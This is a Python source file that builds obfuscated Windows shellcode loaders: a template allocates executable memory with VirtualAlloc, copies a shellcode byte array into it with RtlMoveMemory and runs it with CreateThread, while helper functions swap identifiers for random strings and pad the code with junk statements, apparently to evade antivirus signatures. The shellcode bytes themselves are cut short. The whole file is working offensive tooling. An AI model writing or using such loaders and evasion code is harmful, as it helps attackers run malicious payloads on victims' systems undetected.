import random
import string

class AutoRandom:
    def auto_random_int(self,max_int=999,min_int=0):
        return random.randint(min_int,max_int)

    def auto_random_str(self,min_length=8,max_length=15):
        length=random.randint(min_length,max_length)
        return ''.join(random.choice(string.ascii_letters) for x in range(length))

    def auto_random_void_command(self,min_str=500,max_str=1000,min_int=1,max_ini=9):
        void_command = [
            #'print("var1")'.replace('var1',str(self.auto_random_int(999999))),
            'var1 = var2 + var3'.replace('var1',self.auto_random_str(min_str,max_str)).replace('var2',str(self.auto_random_int(99999))).replace('var3',str(self.auto_random_int(99999))),
            'var1 = var2 - var3'.replace('var1',self.auto_random_str(min_str,max_str)).replace('var2',str(self.auto_random_int(99999))).replace('var3',str(self.auto_random_int(99999))),
            'var1 = var2 * var3'.replace('var1',self.auto_random_str(min_str,max_str)).replace('var2',str(self.auto_random_int(99999))).replace('var3',str(self.auto_random_int(99999))),
            'var1 = var2 / var3'.replace('var1',self.auto_random_str(min_str,max_str)).replace('var2',str(self.auto_random_int(99999))).replace('var3',str(self.auto_random_int(99999))),
            'var1 = "var2" + "var3"'.replace('var1',self.auto_random_str(min_str,max_str)).replace('var2',self.auto_random_str(min_str,max_str)).replace('var3',self.auto_random_str(min_str,max_str)),
            'print("var1")'.replace('var1',self.auto_random_str(min_str,max_str))
            ]
        return void_command[self.auto_random_int(len(void_command)-1)]

def make_variable_random(shellcodeloader):
    shellcodeloader = shellcodeloader.replace("ctypes", AutoRandom.auto_random_str(min_length=8, max_length=15))
    shellcodeloader = shellcodeloader.replace("shellcode",AutoRandom.auto_random_str(min_length=8,max_length=15))
    shellcodeloader = shellcodeloader.replace("ptr", AutoRandom.auto_random_str(min_length=8, max_length=15))
    shellcodeloader = shellcodeloader.replace("buffered", AutoRandom.auto_random_str(min_length=8, max_length=15))
    shellcodeloader = shellcodeloader.replace("handle", AutoRandom.auto_random_str(min_length=8, max_length=15))
    return shellcodeloader

def make_command_random(shellcodeloader):
    shellcodeloader = shellcodeloader.replace("command1", AutoRandom.auto_random_void_command())
    shellcodeloader = shellcodeloader.replace("command2", AutoRandom.auto_random_void_command())
    shellcodeloader = shellcodeloader.replace("command3", AutoRandom.auto_random_void_command())
    shellcodeloader = shellcodeloader.replace("command4", AutoRandom.auto_random_void_command())
    shellcodeloader = shellcodeloader.replace("command5", AutoRandom.auto_random_void_command())
    shellcodeloader = shellcodeloader.replace("command6", AutoRandom.auto_random_void_command())
    shellcodeloader = shellcodeloader.replace("command7", AutoRandom.auto_random_void_command())
    return shellcodeloader

if __name__ == '__main__':
    AutoRandom = AutoRandom()
    shellcodeloader = '''
command1
shellcode = bytearray(b"\xfc\x48\x83\xe4...")

command2
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

command3
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),    
    ctypes.c_int(len(shellcode)), 
    ctypes.c_int(0x3000),  
    ctypes.c_int(0x40)
    )

command4
buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

command5
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

command6
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr),
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0))
)

command7
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
'''

    shellcodeloader = make_variable_random(shellcodeloader)
    shellcodeloader = make_command_random(shellcodeloader)

    print(shellcodeloader)